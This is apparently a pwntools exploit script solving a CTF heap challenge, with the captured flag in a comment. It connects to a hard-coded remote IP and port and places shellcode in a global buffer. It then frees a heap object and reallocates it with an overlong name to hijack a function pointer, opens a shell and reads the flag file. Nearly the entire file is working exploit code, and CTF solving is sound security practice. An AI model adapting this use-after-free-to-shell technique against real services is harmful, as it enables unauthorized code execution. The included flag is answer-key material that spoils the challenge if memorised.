#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# AngelboyCTF{c0DPJYZ9jQlVAtM02SQo}

context.arch = 'amd64'

host , port = '35.194.234.201' , 2118

y = remote( host , port )


def add_dog( name , weight ):
    y.sendlineafter( ':' , '1' )
    y.sendlineafter( ':' , name )
    y.sendlineafter( ':' , str( weight ) )

def sho( idx ):
    y.sendlineafter( ':' , '3' )
    y.sendlineafter( ':' , str( idx ) )

def dle( idx ):
    y.sendlineafter( ':' , '5' )
    y.sendlineafter( ':' , str( idx ) )


nameofzoo = 0x605420

y.sendafter( ':' , asm( shellcraft.sh() ) + p64( nameofzoo ) )

for _ in xrange(2): add_dog( 'a' , 1 )

dle( 0 )

add_dog( 'DDDDDDDD' * 9 + p64( nameofzoo + len( asm( shellcraft.sh() ) ) ) , 0x7777777 )

sho( 0 )

y.sendline( 'cat ./flag.txt' )

y.interactive()

